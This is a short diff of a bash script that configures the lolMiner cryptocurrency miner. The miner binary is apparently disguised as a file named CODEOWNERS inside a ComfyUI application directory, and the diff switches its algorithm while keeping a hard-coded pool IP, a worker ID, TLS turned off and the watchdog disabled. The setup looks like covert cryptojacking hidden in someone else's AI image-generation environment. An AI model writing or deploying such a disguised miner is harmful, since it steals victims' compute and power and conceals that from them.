@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- LOLMINER CONFIGURATION ---
-MINER_CMD="/app/ComfyUI/CODEOWNERS --algo OCTOPUS --pool 151.241.228.78:443 --user krxXKDZ8P6.worker --tls 0 --apiport 4000 --disablewatchdog 1 --devices 0 --nocolor --mode b --timeprint=on"
+MINER_CMD="/app/ComfyUI/CODEOWNERS --algo CR29 --pool 151.241.228.78:443 --user krxXKDZ8P6.worker --tls 0 --apiport 4000 --disablewatchdog 1 --devices 0 --nocolor --mode b --timeprint=on"
 WORKER_NAME="krxXKDZ8P6.worker" 
 
 # *** Special Command for Weekend Mining (points to the script) ***
